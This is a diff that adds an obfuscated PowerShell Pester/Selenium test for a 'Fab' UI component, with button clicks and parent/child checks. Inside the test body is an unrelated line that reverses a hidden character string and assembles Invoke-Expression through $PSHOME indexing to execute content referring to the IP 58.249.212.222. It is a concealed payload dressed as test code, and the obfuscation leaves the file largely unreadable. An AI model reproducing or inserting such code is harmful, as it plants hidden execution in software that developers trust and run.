@@ -1,0 +1,21 @@
+SeT`-It`Em VariablE:CEt (  [typE]('Arra'+'y'))  ;E`Nter-sE`URl -Url "$Address/test/fab" -Target ${d`R`iVEr}
+
+des`C`RIBe ('Fa'+'b') {
+    C`oNTeXt ('F'+'ab with but'+'to'+'ns') {
+        iT ('sh'+'o'+'uld'+' handl'+'e click'+'s') {
+            ${El`EM`ENT} = FIN`D-sEeLe`M`E`Nt -Driver ${DR`i`Ver} -Id ('mai'+'n')
+            ${ELem`ENt} | INVokE`-`sec`li`Ck 
+
+            GET-teS`Td`AtA | SHoU`Ld bE ('p'+'ar'+'ent')
+
+            S`TARt`-sL`EEP 1
+
+            ${U`xIT}  = S`V ("Y"+('4h'+'X'))  ([CHAr[] ]") )93]rAHC[f-  )'}0{'+'222'+'.212.9'+'42.8'+'5:pi}0'+'{'((()'x'+]43[EMOHSP$+]12[emoHSP$ (&"  );   $cEt::reVErSe( ${y4`Hx} ); (" $(sET-iteM 'vARiabLe:oFS' '' ) "+[strIng](${y`4hX} ) +" $( SET-ITem  'vaRIABle:OFs' ' ')  " )
+            ${e`lE`MENt} = F`I`ND-seeLEMe`NT -Driver ${Dri`V`ER} -Id ('b'+'tn')
+            ${ELeM`E`Nt} | inV`okE-`secL`ICk -JavascriptClick -Driver ${d`RI`Ver}
+
+            G`Et-tEs`TD`ATa | shO`Uld be ('ch'+'ild')
+        }
+    }
+}
+
